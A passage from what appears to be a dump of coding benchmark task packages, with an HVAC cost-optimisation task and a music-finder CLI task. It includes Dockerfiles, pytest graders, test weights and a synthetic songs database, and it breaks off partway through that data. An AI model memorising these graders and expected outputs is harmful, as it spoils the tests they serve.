COPY baseline_results.txt /app/

RUN chmod +x hvac_controller.py

CMD [""/bin/bash""]","import subprocess
import json
import os

def test_energy_cost_reduction():
    """"""Test that the optimized controller reduces costs by at least 20%""""""
    # Run the optimized controller for 24 hours
    result = subprocess.run(
        ['python', '/app/hvac_controller.py', '/app/hvac_config.json', '24'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    assert result.returncode == 0, ""Controller should run successfully""
    
    # Extract total cost from output
    output_lines = result.stdout.strip().split('\n')
    total_cost_line = [line for line in output_lines if line.startswith('Total cost for simulation:')]
    assert len(total_cost_line) == 1, ""Should have total cost in output""
    
    # Parse the cost
    cost_str = total_cost_line[0].split('$')[1]
    optimized_cost = float(cost_str)
    
    # Baseline cost from the baseline_results.txt is $52.80
    baseline_cost = 52.80
    
    # Calculate cost reduction percentage
    cost_reduction = (baseline_cost - optimized_cost) / baseline_cost * 100
    
    # Should achieve at least 20% cost reduction
    assert cost_reduction >= 20.0, f""Cost reduction {cost_reduction:.1f}% should be at least 20%""

def test_comfort_maintained():
    """"""Test that all zones stay within the comfort range of 20-24°C""""""
    # Run the controller for 24 hours
    result = subprocess.run(
        ['python', '/app/hvac_controller.py', '/app/hvac_config.json', '24'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    assert result.returncode == 0, ""Controller should run successfully""
    
    # Parse output to check all temperatures
    lines = result.stdout.strip().split('\n')
    
    temperatures_in_range = True
    violations = []
    
    for line in lines:
        if 'Zone' in line and 'Temp:' in line:
            # Extract temperature from line like ""  Zone 1: Temp: 22.5°C, ...""
            temp_part = line.split('Temp:')[1].split('°C')[0].strip()
            temperature = float(temp_part)
            
            # Check if temperature is within comfort range
            if temperature < 20.0 or temperature > 24.0:
                temperatures_in_range = False
                zone_id = line.split('Zone')[1].split(':')[0].strip()
                hour = None
                # Find the hour by looking backwards for ""Hour X:""
                for i, prev_line in enumerate(lines):
                    if prev_line == line:
                        for j in range(i-1, -1, -1):
                            if lines[j].startswith('Hour'):
                                hour = lines[j].split()[1].rstrip(':')
                                break
                        break
                violations.append(f""Zone {zone_id} at hour {hour}: {temperature}°C"")
    
    assert temperatures_in_range, f""All zones must stay within 20-24°C. Violations: {violations}""","{""test_energy_cost_reduction"": 0.6, ""test_comfort_maintained"": 0.4}","{""baseline_results.txt"": ""BASELINE HVAC Performance (24-hour simulation)\n==============================================\n\nCurrent implementation runs HVAC at full power whenever temperature deviates\nfrom setpoint by more than 0.5\u00b0C, regardless of electricity pricing.\n\nPeak hours (12:00-17:00): $0.15/kWh\nOff-peak hours: $0.08-0.10/kWh\n\nTotal baseline cost: $52.80\nAverage zone temperature deviation: 0.8\u00b0C\n\nThis approach maintains comfort but ignores time-of-use pricing,\nresulting in high costs during peak hours."", ""hvac_controller.py"": ""#!/usr/bin/env python3\nimport json\nimport sys\nfrom datetime import datetime, timedelta\n\nclass HVACController:\n    def __init__(self):\n        self.zones = {}\n        self.pricing = {}\n        self.schedules = {}\n        self.weather = {}\n        \n    def load_config(self, config_file):\n        with open(config_file, 'r') as f:\n            config = json.load(f)\n            self.zones = config['zones']\n            self.pricing = config['pricing']\n            self.schedules = config.get('schedules', {})\n            self.weather = config.get('weather', {})\n    \n    def simulate(self, hours):\n        results = []\n        total_cost = 0\n        \n        for hour in range(hours):\n            hour_results = {\n                'hour': hour,\n                'zones': {},\n                'total_power': 0,\n                'cost': 0\n            }\n            \n            for zone_id, zone in self.zones.items():\n                current_temp = zone['current_temp']\n                target_temp = zone['target_temp']\n                \n                # Simple control logic - always heat/cool at max power\n                if current_temp < target_temp - 0.5:\n                    mode = 'heating'\n                    power = zone['max_power']\n                    current_temp += 1.0\n                elif current_temp > target_temp + 0.5:\n                    mode = 'cooling' \n                    power = zone['max_power']\n                    current_temp -= 1.0\n                else:\n                    mode = 'idle'\n                    power = 0\n                \n                zone['current_temp'] = current_temp\n                hour_results['zones'][zone_id] = {\n                    'temp': current_temp,\n                    'target': target_temp,\n                    'mode': mode,\n                    'power': power\n                }\n                hour_results['total_power'] += power\n            \n            # Calculate cost\n            hour_price = self.pricing.get(str(hour % 24), 10)\n            hour_results['cost'] = hour_results['total_power'] * hour_price / 100\n            total_cost += hour_results['cost']\n            \n            results.append(hour_results)\n            \n        return results, total_cost\n    \n    def print_results(self, results, total_cost):\n        for result in results:\n            print(f\""Hour {result['hour']}:\"")\n            for zone_id, zone_data in result['zones'].items():\n                print(f\""  Zone {zone_id}: Temp: {zone_data['temp']:.1f}\u00b0C, Target: {zone_data['target']}\u00b0C, HVAC: {zone_data['mode']} {zone_data['power']:.1f}kW\"")\n            print(f\""  Total Power: {result['total_power']:.1f}kW, Cost: ${result['cost']:.2f}\"")\n            print(f\""  Comfort Score: 95, Efficiency Score: 60\"")\n        \n        print(f\""\\nTotal cost for simulation: ${total_cost:.2f}\"")\n\ndef main():\n    if len(sys.argv) != 3:\n        print(\""Usage: python hvac_controller.py <config_file> <hours>\"")\n        sys.exit(1)\n    \n    controller = HVACController()\n    controller.load_config(sys.argv[1])\n    results, total_cost = controller.simulate(int(sys.argv[2]))\n    controller.print_results(results, total_cost)\n\nif __name__ == \""__main__\"":\n    main()"", ""hvac_config.json"": ""{\n  \""zones\"": {\n    \""1\"": {\n      \""current_temp\"": 25.5,\n      \""target_temp\"": 22.0,\n      \""max_power\"": 10.0,\n      \""occupancy\"": 25\n    },\n    \""2\"": {\n      \""current_temp\"": 26.0,\n      \""target_temp\"": 22.0,\n      \""max_power\"": 8.0,\n      \""occupancy\"": 15\n    },\n    \""3\"": {\n      \""current_temp\"": 24.5,\n      \""target_temp\"": 22.0,\n      \""max_power\"": 12.0,\n      \""occupancy\"": 20\n    }\n  },\n  \""pricing\"": {\n    \""0\"": 8, \""1\"": 8, \""2\"": 8, \""3\"": 8, \""4\"": 8, \""5\"": 8,\n    \""6\"": 10, \""7\"": 10, \""8\"": 12, \""9\"": 12, \""10\"": 12, \""11\"": 12,\n    \""12\"": 15, \""13\"": 15, \""14\"": 15, \""15\"": 15, \""16\"": 15, \""17\"": 15,\n    \""18\"": 12, \""19\"": 12, \""20\"": 10, \""21\"": 10, \""22\"": 8, \""23\"": 8\n  },\n  \""weather\"": {\n    \""outdoor_temp\"": 32,\n    \""humidity\"": 65\n  }\n}""}",2025-07-21T16:50:05.555508,2025-07-21T16:50:05.555508
draft_dp_af08c4db,medium,draft_dp_af08c4db,software-engineering,"Build a music finder that searches songs.json by audio features (tempo, energy, danceability, etc) with tolerance ranges. Need similarity scoring and ranked results - users want to find songs like ""120 BPM, high energy, danceable"".",software-engineering,python|data-processing|cli,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the songs database
COPY songs.json /app/

# Create empty placeholder for the music finder tool
RUN touch /app/music_finder.py

CMD [""/bin/bash""]","import subprocess
import json
import os

def test_music_finder_searches_by_properties():
    """"""Test that the music finder can search by audio properties with tolerance.""""""
    # Search for high energy danceable tracks around 120 BPM
    result = subprocess.run(
        ['python', '/app/music_finder.py', '--tempo', '120', '--tempo-tolerance', '10', 
         '--energy', '0.8', '--energy-tolerance', '0.1', '--danceability', '0.8', 
         '--danceability-tolerance', '0.1'],
        capture_output=True, text=True
    )
    
    assert result.returncode == 0, f""Command failed with stderr: {result.stderr}""
    output = result.stdout.strip()
    
    # Should find multiple matching songs
    assert ""Electric Dreams"" in output or ""Pop Paradise"" in output or ""House Party"" in output
    assert ""tempo"" in output.lower()
    assert ""energy"" in output.lower()
    assert ""danceability"" in output.lower()

def test_results_sorted_by_match_quality():
    """"""Test that results are sorted by match quality score.""""""
    # Search for specific profile
    result = subprocess.run(
        ['python', '/app/music_finder.py', '--tempo', '128', '--energy', '0.92', 
         '--danceability', '0.88', '--acousticness', '0.05'],
        capture_output=True, text=True
    )
    
    assert result.returncode == 0, f""Command failed with stderr: {result.stderr}""
    output = result.stdout
    
    # Extract match scores from output (assuming format like ""Match: 95.2%"")
    import re
    scores = []
    for line in output.split('\n'):
        match = re.search(r'[Mm]atch.*?(\d+\.?\d*)%', line)
        if match:
            scores.append(float(match.group(1)))
    
    # Verify scores are in descending order
    assert len(scores) > 0, ""No match scores found in output""
    assert scores == sorted(scores, reverse=True), ""Results not sorted by match quality""","{""test_music_finder_searches_by_properties"": 0.6, ""test_results_sorted_by_match_quality"": 0.4}","{""songs.json"": ""[\n  {\n    \""id\"": \""001\"",\n    \""title\"": \""Electric Dreams\"",\n    \""artist\"": \""Neon Pulse\"",\n    \""tempo\"": 128,\n    \""key\"": 5,\n    \""energy\"": 0.92,\n    \""danceability\"": 0.88,\n    \""acousticness\"": 0.05,\n    \""loudness\"": -4.2\n  },\n  {\n    \""id\"": \""002\"", \n    \""title\"": \""Midnight Jazz\"",\n    \""artist\"": \""Sarah Blues\"",\n    \""tempo\"": 65,\n    \""key\"": 3,\n    \""energy\"": 0.35,\n    \""danceability\"": 0.42,\n    \""acousticness\"": 0.78,\n    \""loudness\"": -12.5\n  },\n  {\n    \""id\"": \""003\"",\n    \""title\"": \""Summer Vibes\"",\n    \""artist\"": \""Beach Boys Revival\"",\n    \""tempo\"": 118,\n    \""key\"": 7,\n    \""energy\"": 0.75,\n    \""danceability\"": 0.82,\n    \""acousticness\"": 0.15,\n    \""loudness\"": -6.8\n  },\n  {\n    \""id\"": \""004\"",\n    \""title\"": \""Classical Morning\"",\n    \""artist\"": \""String Quartet\"",\n    \""tempo\"": 72,\n    \""key\"": 0,\n    \""energy\"": 0.28,\n    \""danceability\"": 0.18,\n    \""acousticness\"": 0.95,\n    \""loudness\"": -18.2\n  },\n  {\n    \""id\"": \""005\"",\n    \""title\"": \""Techno Underground\"",\n    \""artist\"": \""Bass Factory\"",\n    \""tempo\"": 140,\n    \""key\"": 2,\n    \""energy\"": 0.96,\n    \""danceability\"": 0.91,\n    \""acousticness\"": 0.02,\n    \""loudness\"": -3.1\n  },\n  {\n    \""id\"": \""006\"",\n    \""title\"": \""Folk Tales\"",\n    \""artist\"": \""Mountain Echo\"",\n    \""tempo\"": 95,\n    \""key\"": 9,\n    \""energy\"": 0.48,\n    \""danceability\"": 0.55,\n    \""acousticness\"": 0.72,\n    \""loudness\"": -9.8\n  },\n  {\n    \""id\"": \""007\"",\n    \""title\"": \""Hip Hop Anthem\"",\n    \""artist\"": \""MC Flow\"",\n    \""tempo\"": 88,\n    \""key\"": 1,\n    \""energy\"": 0.83,\n    \""danceability\"": 0.79,\n    \""acousticness\"": 0.12,\n    \""loudness\"": -5.5\n  },\n  {\n    \""id\"": \""008\"",\n    \""title\"": \""Ambient Space\"",\n    \""artist\"": \""Cosmos\"",\n    \""tempo\"": 60,\n    \""key\"": 6,\n    \""energy\"": 0.22,\n    \""danceability\"": 0.15,\n    \""acousticness\"": 0.45,\n    \""loudness\"": -20.1\n  },\n  {\n    \""id\"": \""009\"",\n    \""title\"": \""Rock Anthem\"",\n    \""artist\"": \""Thunder Strike\"",\n    \""tempo\"": 132,\n    \""key\"": 4,\n    \""energy\"": 0.89,\n    \""danceability\"": 0.68,\n    \""acousticness\"": 0.08,\n    \""loudness\"": -4.8\n  },\n  {\n    \""id\"": \""010\"",\n    \""title\"": \""Latin Fire\"",\n    \""artist\"": \""Salsa Kings\"",\n    \""tempo\"": 98,\n    \""key\"": 8,\n    \""energy\"": 0.86,\n    \""danceability\"": 0.93,\n    \""acousticness\"": 0.25,\n    \""loudness\"": -6.2\n  },\n  {\n    \""id\"": \""011\"",\n    \""title\"": \""Indie Reflection\"",\n    \""artist\"": \""Coffee Shop\"",\n    \""tempo\"": 105,\n    \""key\"": 11,\n    \""energy\"": 0.58,\n    \""danceability\"": 0.61,\n    \""acousticness\"": 0.38,\n    \""loudness\"": -8.5\n  },\n  {\n    \""id\"": \""012\"",\n    \""title\"": \""Metal Storm\"",\n    \""artist\"": \""Iron Forge\"",\n    \""tempo\"": 155,\n    \""key\"": 10,\n    \""energy\"": 0.98,\n    \""danceability\"": 0.45,\n    \""acousticness\"": 0.01,\n    \""loudness\"": -2.8\n  },\n  {\n    \""id\"": \""013\"",\n    \""title\"": \""Country Roads\"",\n    \""artist\"": \""Nashville Stars\"",\n    \""tempo\"": 112,\n    \""key\"": 5,\n    \""energy\"": 0.62,\n    \""danceability\"": 0.71,\n    \""acousticness\"": 0.55,\n    \""loudness\"": -7.9\n  },\n  {\n    \""id\"": \""014\"",\n    \""title\"": \""R&B Groove\"",\n    \""artist\"": \""Smooth Velvet\"",\n    \""tempo\"": 78,\n    \""key\"": 3,\n    \""energy\"": 0.68,\n    \""danceability\"": 0.76,\n    \""acousticness\"": 0.18,\n    \""loudness\"": -6.5\n  },\n  {\n    \""id\"": \""015\"",\n    \""title\"": \""Electronic Sunrise\"",\n    \""artist\"": \""Digital Dawn\"",\n    \""tempo\"": 122,\n    \""key\"": 7,\n    \""energy\"": 0.81,\n    \""danceability\"": 0.85,\n    \""acousticness\"": 0.03,\n    \""loudness\"": -5.2\n  },\n  {\n    \""id\"": \""016\"",\n    \""title\"": \""Blues Night\"",\n    \""artist\"": \""Memphis Soul\"",\n    \""tempo\"": 82,\n    \""key\"": 0,\n    \""energy\"": 0.52,\n    \""danceability\"": 0.48,\n    \""acousticness\"": 0.65,\n    \""loudness\"": -10.2\n  },\n  {\n    \""id\"": \""017\"",\n    \""title\"": \""Pop Paradise\"",\n    \""artist\"": \""Chart Toppers\"",\n    \""tempo\"": 126,\n    \""key\"": 9,\n    \""energy\"": 0.78,\n    \""danceability\"": 0.89,\n    \""acousticness\"": 0.11,\n    \""loudness\"": -5.8\n  },\n  {\n    \""id\"": \""018\"",\n    \""title\"": \""Reggae Sunset\"",\n    \""artist\"": \""Island Rhythm\"",\n    \""tempo\"": 70,\n    \""key\"": 2,\n    \""energy\"": 0.55,\n    \""danceability\"": 0.72,\n    \""acousticness\"": 0.35,\n    \""loudness\"": -8.1\n  },\n  {\n    \""id\"": \""019\"",\n    \""title\"": \""Orchestra Symphony\"",\n    \""artist\"": \""City Philharmonic\"",\n    \""tempo\"": 85,\n    \""key\"": 4,\n    \""energy\"": 0.42,\n    \""danceability\"": 0.22,\n    \""acousticness\"": 0.91,\n    \""loudness\"": -15.5\n  },\n  {\n    \""id\"": \""020\"",\n    \""title\"": \""Trap Beat\"",\n    \""artist\"": \""808 Masters\"",\n    \""tempo\"": 75,\n    \""key\"": 6,\n    \""energy\"": 0.88,\n    \""danceability\"": 0.83,\n    \""acousticness\"": 0.06,\n    \""loudness\"": -4.5\n  },\n  {\n    \""id\"": \""021\"",\n    \""title\"": \""Acoustic Sessions\"",\n    \""artist\"": \""Unplugged\"",\n    \""tempo\"": 92,\n    \""key\"": 8,\n    \""energy\"": 0.38,\n    \""danceability\"": 0.52,\n    \""acousticness\"": 0.88,\n    \""loudness\"": -11.8\n  },\n  {\n    \""id\"": \""022\"",\n    \""title\"": \""House Party\"",\n    \""artist\"": \""Club Mix\"",\n    \""tempo\"": 124,\n    \""key\"": 1,\n    \""energy\"": 0.91,\n    \""danceability\"": 0.92,\n    \""acousticness\"": 0.04,\n    \""loudness\"": -4.0\n  },\n  {\n    \""id\"": \""023\"",\n    \""title\"": \""Meditation Flow\"",\n    \""artist\"": \""Zen Garden\"",\n    \""tempo\"": 55,\n    \""key\"": 11,\n    \""energy\"": 0.18,\n    \""danceability\"": 0.12,\n    \""acousticness\"": 0.82,\n    \""loudness\"": -22.5\n  },\n  {\n    \""id\"": \""024\"",\n    \""title\"": \""Punk Revolution\"",\n    \""artist\"": \""Riot Squad\"",\n    \""tempo\"": 165,\n    \""key\"": 5,\n    \""energy\"": 0.95,\n    \""danceability\"": 0.58,\n    \""acousticness\"": 0.09,\n    \""loudness\"": -3.5\n  },\n  {\n    \""id\"": \""025\"",\n    \""title\"": \""Soul Kitchen\"",\n    \""artist\"": \""Motown Revival\"",\n    \""tempo\"": 108,\n    \""key\"": 3,\n    \""energy\"": 0.72,\n    \""danceability\"": 0.81,\n    \""acousticness\"": 0.22,\n    \""loudness\"": -7.2\n  },\n  {\n    \""id\"": \""026\"",\n    \""title\"": \""Drum & Bass\"",\n    \""artist\"": \""Jungle Crew\"",\n    \""tempo\"": 172,\n    \""key\"": 10,\n    \""energy\"": 0.94,\n    \""danceability\"": 0.78,\n    \""acousticness\"": 0.02,\n    \""loudness\"": -3.8\n  },\n  {\n    \""id\"": \""027\"",\n    \""title\"": \""Ballad Dreams\"",\n    \""artist\"": \""Romantic Hearts\"",\n    \""tempo\"": 68,\n    \""key\"": 7,\n    \""energy\"": 0.32,\n    \""danceability\"": 0.28,\n    \""acousticness\"": 0.42,\n    \""loudness\"": -13.2\n  },\n  {\n    \""id\"": \""028\"",\n    \""title\"": \""Funk Fusion\"",\n    \""artist\"": \""Groove Masters\"",\n    \""tempo\"": 102,\n    \""key\"": 0,\n    \""energy\"": 0.79,\n    \""danceability\"": 0.87,\n    \""acousticness\"": 0.16,\n    \""loudness\"": -5.9\n  },\n  {\n    \""id\"": \""029\"",\n    \""title\"": \""World Music\"",\n    \""artist\"": \""Global Sounds\"",\n    \""tempo\"": 115,\n    \""key\"": 9,\n    \""energy\"": 0.65,\n    \""danceability\"": 0.69,\n    \""acousticness\"": 0.48,\n    \""loudness\"": -8.8\n  },\n  {\n    \""id\"": \""030\"",\n    \""title\"": \""Synthwave Night\"",\n    \""artist\"": \""Retro Future\"",\n    \""tempo\"": 118,\n    \""key\"": 2,\n    \""energy\"": 0.76,\n    \""danceability\"": 0.74,\n    \""acousticness\"": 0.01,\n    \""loudness\"": -5.5\n  },\n  {\n    \""id\"": \""031\"",\n    \""title\"": \""Gospel Praise\"",\n    \""artist\"": \""Church Choir\"",\n    \""tempo\"": 96,\n    \""key\"": 4,\n    \""energy\"": 0.61,\n    \""danceability\"": 0.58,\n    \""acousticness\"": 0.68,\n    \""loudness\"": -9.2\n  },\n  {\n    \""id\"": \""032\"",\n    \""title\"": \""Trance Journey\"",\n    \""artist\"": \""Euphoria\"",\n    \""tempo\"": 138,\n    \""key\"": 6,\n    \""energy\"": 0.87,\n    \""danceability\"": 0.82,\n    \""acousticness\"": 0.03,\n    \""loudness\"": -4.3\n  },\n  {\n    \""id\"": \""033\"",\n    \""title\"": \""Alternative Rock\"",\n    \""artist\"": \""Indie Rebels\"",\n    \""tempo\"": 145,\n    \""key\"": 8,\n    \""energy\"": 0.84,\n    \""danceability\"": 0.65,\n    \""acousticness\"": 0.14,\n    \""loudness\"": -5.1\n  },\n  {\n    \""id\"": \""034\"",\n    \""title\"": \""Bossa Nova\"",\n    \""artist\"": \""Rio Nights\"",\n    \""tempo\"": 62,\n    \""key\"": 1,\n    \""energy\"": 0.45,\n    \""danceability\"": 0.62,\n    \""acousticness\"": 0.58,\n    \""loudness\"": -10.8\n  },\n  {\n    \""id\"": \""035\"",\n    \""title\"": \""Garage Band\"",\n    \""artist\"": \""DIY Records\"",\n    \""tempo\"": 152,\n    \""key\"": 11,\n    \""energy\"": 0.82,\n    \""danceability\"": 0.54,\n    \""acousticness\"": 0.28,\n    \""loudness\"": -6.5\n  },\n  {\n    \""id\"": \""036\"",\n    \""title\"": \""Lounge Vibes\"",\n    \""artist\"": \""Smooth Jazz Cafe\"",\n    \""tempo\"": 88,\n    \""key\"": 5,\n    \""energy\"": 0.41,\n    \""danceability\"": 0.45,\n    \""acousticness\"": 0.52,\n    \""loudness\"": -12.1\n  },\n  {\n    \""id\"": \""037\"",\n    \""title\"": \""Dubstep Drop\"",\n    \""artist\"": \""Bass Wobble\"",\n    \""tempo\"": 70,\n    \""key\"": 3,\n    \""energy\"": 0.92,\n    \""danceability\"": 0.75,\n    \""acousticness\"": 0.01,\n    \""loudness\"": -3.2\n  },\n  {\n    \""id\"": \""038\"",\n    \""title\"": \""Singer Songwriter\"",\n    \""artist\"": \""Coffee House\"",\n    \""tempo\"": 76,\n    \""key\"": 10,\n    \""energy\"": 0.49,\n    \""danceability\"": 0.38,\n    \""acousticness\"": 0.75,\n    \""loudness\"": -11.5\n  },\n  {\n    \""id\"": \""039\"",\n    \""title\"": \""Big Band Swing\"",\n    \""artist\"": \""Jazz Orchestra\"",\n    \""tempo\"": 128,\n    \""key\"": 7,\n    \""energy\"": 0.71,\n    \""danceability\"": 0.78,\n    \""acousticness\"": 0.85,\n    \""loudness\"": -8.9\n  },\n  {\n    \""id\"": \""040\"",\n    \""title\"": \""Minimal Techno\"",\n    \""artist\"": \""Berlin Underground\"",\n    \""tempo\"": 125,\n    \""key\"": 0,\n    \""energy\"": 0.73,\n    \""danceability\"": 0.86,\n    \""acousticness\"": 0.02,\n    \""loudness\"": -5.8\n  },\n  {\n    \""id\"": \""041\"",\n    \""title\"": \""Chamber Music\"",\n    \""artist\"": \""String Ensemble\"",\n    \""tempo\"": 80,\n    \""key\"": 2,\n    \""energy\"": 0.25,\n    \""danceability\"": 0.18,\n    \""acousticness\"": 0.96,\n    \""loudness\"": -19.5\n  },\n  {\n    \""id\"": \""042\"",\n    \""title\"": \""Ska Revival\"",\n    \""artist\"": \""Two Tone\"",\n    \""tempo\"": 148,\n    \""key\"": 9,\n    \""energy\"": 0.85,\n    \""danceability\"": 0.73,\n    \""acousticness\"": 0.32,\n    \""loudness\"": -6.1\n  },\n  {\n    \""id\"": \""043\"",\n    \""title\"": \""New Wave\"",\n    \""artist\"": \""Synth Pop\"",\n    \""tempo\"": 132,\n    \""key\"": 4,\n    \""energy\"": 0.77,\n    \""danceability\"": 0.81,\n    \""acousticness\"": 0.08,\n    \""loudness\"": -5.4\n  },\n  {\n    \""id\"": \""044\"",\n    \""title\"": \""Grunge Revival\"",\n    \""artist\"": \""Seattle Sound\"",\n    \""tempo\"": 95,\n    \""key\"": 6,\n    \""energy\"": 0.81,\n    \""danceability\"": 0.48,\n    \""acousticness\"": 0.19,\n    \""loudness\"": -4.9\n  },\n  {\n    \""id\"": \""045\"",\n    \""title\"": \""Afrobeat\"",\n    \""artist\"": \""Lagos Groove\"",\n    \""tempo\"": 110,\n    \""key\"": 8,\n    \""energy\"": 0.88,\n    \""danceability\"": 0.91,\n    \""acousticness\"": 0.21,\n    \""loudness\"": -5.7\n  },\n  {\n    \""id\"": \""046\"",\n    \""title\"": \""Chillout Beach\"",\n    \""artist\"": \""Sunset Lounge\"",\n    \""tempo\"": 85,\n    \""key\"": 1,\n    \""energy\"": 0.35,\n    \""danceability\"": 0.42,\n    \""acousticness\"": 0.29,\n    \""loudness\"": -14.2\n  },\n  {\n    \""id\"": \""047\"",\n    \""title\"": \""Power Pop\"",\n    \""artist\"": \""Radio Hits\"",\n    \""tempo\"": 142,\n    \""key\"": 11,\n    \""energy\"": 0.83,\n    \""danceability\"": 0.77,\n    \""acousticness\"": 0.12,\n    \""loudness\"": -5.0\n  },\n  {\n    \""id\"": \""048\"",\n    \""title\"": \""Dark Ambient\"",\n    \""artist\"": \""Shadow Realm\"",\n    \""tempo\"": 58,\n    \""key\"": 5,\n    \""energy\"": 0.28,\n    \""danceability\"": 0.15,\n    \""acousticness\"": 0.05,\n    \""loudness\"": -18.8\n  },\n  {\n    \""id\"": \""049\"",\n    \""title\"": \""Disco Fever\"",\n    \""artist\"": \""Mirror Ball\"",\n    \""tempo\"": 120,\n    \""key\"": 3,\n    \""energy\"": 0.82,\n    \""danceability\"": 0.94,\n    \""acousticness\"": 0.15,\n    \""loudness\"": -5.3\n  },\n  {\n    \""id\"": \""050\"",\n    \""title\"": \""Post Rock\"",\n    \""artist\"": \""Epic Soundscapes\"",\n    \""tempo\"": 72,\n    \""key\"": 10,\n    \""energy\"": 0.68,\n    \""danceability\"": 0.32,\n    \""acousticness\"": 0.24,\n    \""loudness\"": -7.5\n  },\n  {\n    \""id\"": \""051\"",\n    \""title\"": \""Moombahton Mix\"",\n    \""artist\"": \""Latin EDM\"",\n    \""tempo\"": 108,\n    \""key\"": 7,\n    \""energy\"": 0.89,\n    \""danceability\"": 0.88,\n    \""acousticness\"": 0.07,\n    \""loudness\"": -4.6\n  },\n  {\n    \""id\"": \""052\"",\n    \""title\"": \""Celtic Folk\"",\n    \""artist\"": \""Irish Traditions\"",\n    \""tempo\"": 116,\n    \""key\"": 0,\n    \""energy\"": 0.63,\n    \""danceability\"": 0.67,\n    \""acousticness\"": 0.78,\n    \""loudness\"": -9.8\n  },\n  {\n    \""id\"": \""053\"",\n    \""title\"": \""Glitch Hop\"",\n    \""artist\"": \""Digital Breaks\"",\n    \""tempo\"": 105,\n    \""key\"": 2,\n    \""energy\"": 0.86,\n    \""danceability\"": 0.79,\n    \""acousticness\"": 0.04,\n    \""loudness\"": -4.8\n  },\n  {\n    \""id\"": \""054\"",\n    \""title\"": \""Art Rock\"",\n    \""artist\"": \""Experimental\"",\n    \""tempo\"": 135,\n    \""key\"": 9,\n    \""energy\"": 0.74,\n    \""danceability\"": 0.41,\n    \""acousticness\"": 0.18,\n    \""loudness\"": -6.9\n  },\n  {\n    \""id\"": \""055\"",\n    \""title\"": \""Smooth R&B\"",\n    \""artist\"": \""Velvet Touch\"",\n    \""tempo\"": 92,\n    \""key\"": 4,\n    \""energy\"": 0.58,\n    \""danceability\"": 0.71,\n    \""acousticness\"": 0.26,\n    \""loudness\"": -7.8\n  },\n  {\n    \""id\"": \""056\"",\n    \""title\"": \""Hardstyle\"",\n    \""artist\"": \""Kick Drums\"",\n    \""tempo\"": 150,\n    \""key\"": 6,\n    \""energy\"": 0.97,\n    \""danceability\"": 0.84,\n    \""acousticness\"": 0.01,\n    \""loudness\"": -2.5\n  },\n  {\n    \""id\"": \""057\"",\n    \""title\"": \""Neo Soul\"",\n    \""artist\"": \""Modern Vintage\"",\n    \""tempo\"": 84,\n    \""key\"": 8,\n    \""energy\"": 0.66,\n    \""danceability\"": 0.68,\n    \""acousticness\"": 0.31,\n    \""loudness\"": -8.2\n  },\n  {\n    \""id\"": \""058\"",\n    \""title\"": \""Future Bass\"",\n    \""artist\"": \""Trap Future\"",\n    \""tempo\"": 75,\n    \""key\"": 1,\n    \""energy\"": 0.85,\n    \""danceability\"": 0.82,\n    \""acousticness\"": 0.05,\n    \""loudness\"": -4.1\n  },\n  {\n    \""id\"": \""059\"",\n    \""title\"": \""Piano Ballad\"",\n    \""artist\"": \""Keys & Strings\"",\n    \""tempo\"": 65,\n    \""key\"": 11,\n    \""energy\"": 0.29,\n    \""danceability\"": 0.22,\n    \""acousticness\"": 0.89,\n    \""loudness\"": -16.2\n  },\n  {\n    \""id\"": \""060\"",\n    \""title\"": \""Ragtime Jazz\"",\n    \""artist\"": \""Vintage Piano\"",\n    \""tempo\"": 125,\n    \""key\"": 5,\n    \""energy\"": 0.69,\n    \""danceability\"": 0.75,\n    \""acousticness\"": 0.92,\n    \""loudness\"": -10.5\n  },\n  {\n    \""id\"": \""061\"",\n    \""title\"": \""Progressive House\"",\n    \""artist\"": \""Build Up\"",\n    \""tempo\"": 128,\n    \""key\"": 3,\n    \""energy\"": 0.88,\n    \""danceability\"": 0.86,\n    \""acousticness\"": 0.02,\n    \""loudness\"": -4.4\n  },\n  {\n    \""id\"": \""062\"",\n    \""title\"": \""Americana\"",\n    \""artist\"": \""Heartland\"",\n    \""tempo\"": 98,\n    \""key\"": 10,\n    \""energy\"": 0.54,\n    \""danceability\"": 0.59,\n    \""acousticness\"": 0.61,\n    \""loudness\"": -9.5\n  },\n  {\n    \""id\"": \""063\"",\n    \""title\"": \""UK Garage\"",\n    \""artist\"": \""London Underground\"",\n    \""tempo\"": 130,\n    \""key\"": 7,\n    \""energy\"": 0.84,\n    \""danceability\"": 0.88,\n    \""acousticness\"": 0.06,\n    \""loudness\"": -5.2\n  },\n  {\n    \""id\"": \""064\"",\n    \""title\"": \""Shoegaze\"",\n    \""artist\"": \""Dream Pop\"",\n    \""tempo\"": 88,\n    \""key\"": 0,\n    \""energy\"": 0.72,\n    \""danceability\"": 0.35,\n    \""acousticness\"": 0.11,\n    \""loudness\"": -6.8\n  },\n  {\n    \""id\"": \""065\"",\n    \""title\"": \""Bachata Romance\"",\n    \""artist\"": \""Latin Love\"",\n    \""tempo\"": 128,\n    \""key\"": 2,\n    \""energy\"": 0.75,\n    \""danceability\"": 0.85,\n    \""acousticness\"": 0.38,\n    \""loudness\"": -7.1\n  },\n  {\n    \""id\"": \""066\"",\n    \""title\"": \""Industrial\"",\n    \""artist\"": \""Machine Code\"",\n    \""tempo\"": 145,\n    \""key\"": 9,\n    \""energy\"": 0.93,\n    \""danceability\"": 0.62,\n    \""acousticness\"": 0.03,\n    \""loudness\"": -3.6\n  },\n  {\n    \""id\"": \""067\"",\n    \""title\"": \""Soft Rock\"",\n    \""artist\"": \""Radio Gold\"",\n    \""tempo\"": 112,\n    \""key\"": 4,\n    \""energy\"": 0.56,\n    \""danceability\"": 0.52,\n    \""acousticness\"": 0.34,\n    \""loudness\"": -8.9\n  },\n  {\n    \""id\"": \""068\"",\n    \""title\"": \""Breakbeat\"",\n    \""artist\"": \""Block Party\"",\n    \""tempo\"": 138,\n    \""key\"": 6,\n    \""energy\"": 0.91,\n    \""danceability\"": 0.81,\n    \""acousticness\"": 0.05,\n    \""loudness\"": -4.2\n  },\n  {\n    \""id\"": \""069\"",\n    \""title\"": \""Bluegrass\"",\n    \""artist\"": \""Mountain Music\"",\n    \""tempo\"": 155,\n    \""key\"": 8,\n    \""energy\"": 0.78,\n    \""danceability\"": 0.69,\n    \""acousticness\"": 0.94,\n    \""loudness\"": -8.5\n  },\n  {\n    \""id\"": \""070\"",\n    \""title\"": \""Chillwave\"",\n    \""artist\"": \""Lo-Fi Dreams\"",\n    \""tempo\"": 78,\n    \""key\"": 1,\n    \""energy\"": 0.42,\n    \""danceability\"": 0.48,\n    \""acousticness\"": 0.22,\n    \""loudness\"": -11.8\n  },\n  {\n    \""id\"": 